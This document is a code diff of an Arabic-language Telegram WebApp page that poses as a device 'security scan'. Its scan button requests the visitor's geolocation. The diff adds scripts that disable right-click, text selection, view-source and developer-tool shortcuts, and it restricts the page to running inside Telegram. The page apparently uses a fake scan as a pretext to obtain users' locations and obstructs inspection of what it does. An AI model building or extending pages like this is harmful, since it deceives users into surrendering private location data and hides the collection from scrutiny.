@@ -14,6 +14,11 @@
             text-align: center;
             padding: 20px;
             margin: 0;
+            /* منع تحديد النصوص بالرؤية أو الماوس */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         .container {
             max-width: 400px;
@@ -58,7 +63,7 @@
 <body>
 
     <div class="container" id="main-card">
-        <h2>🛡️️ نظام فحص الأمان</h2>
+        <h2>🛡 نظام فحص الأمان</h2>
         <p id="welcome-msg">أهلاً بك. اضغط على الزر أدناه لبدء عملية التحقق والفحص الأمني الحالي لجهازك.</p>
         
         <button class="btn" id="start-btn" onclick="requestLocation()">بدء الفحص 🔍</button>
@@ -67,10 +72,33 @@
     </div>
 
     <script>
+        // 🔒 حماية المصدر: منع النقر بالزر الأيمن للفأرة
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // 🔒 حماية المصدر: منع اختصارات لوحة المفاتيح لعرض المصدر أو أدوات المطورين
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'h' || e.key === 'H')) {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.key === 'K' || e.key === 'k')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // التحقق من البيئة وتشغيل تليجرام
         window.addEventListener('DOMContentLoaded', (event) => {
             const telegram = window.Telegram && window.Telegram.WebApp;
             
-            // 🔒 حماية أمنية: التأكد أن الصفحة مفتوحة من داخل تليجرام فقط وليست من سفاري أو المتصفح الخارجي
+            // 🔒 حماية تليجرام: التأكد أن الصفحة مفتوحة حصرياً من داخل التطبيق وليست من سفاري أو المتصفح
             if (!telegram || !telegram.initData || telegram.initData === "") {
                 document.body.innerHTML = `
                     <div style="text-align: center; margin-top: 80px; font-family: Tahoma; color: #c0392b; padding: 20px;">
@@ -79,17 +107,12 @@
                     </div>
                 `;
             } else {
-                // تهيئة تليجرام وتوسيع النافذة لملء الشاشة
                 telegram.ready();
                 telegram.expand();
-                
-                // جلب معرف المستخدم من تليجرام إن وجد
-                const userId = telegram.initDataUnsafe && telegram.initDataUnsafe.user ? telegram.initDataUnsafe.user.id : "غير معروف";
-                console.log("User ID connected:", userId);
             }
         });
 
-        // دالة طلب الموقع بطريقة احترافية عند الضغط على الزر فقط
+        // طلب الموقع الجغرافي عند الضغط على الزر
         function requestLocation() {
             const resultDiv = document.getElementById("result");
             const btn = document.getElementById("start-btn");
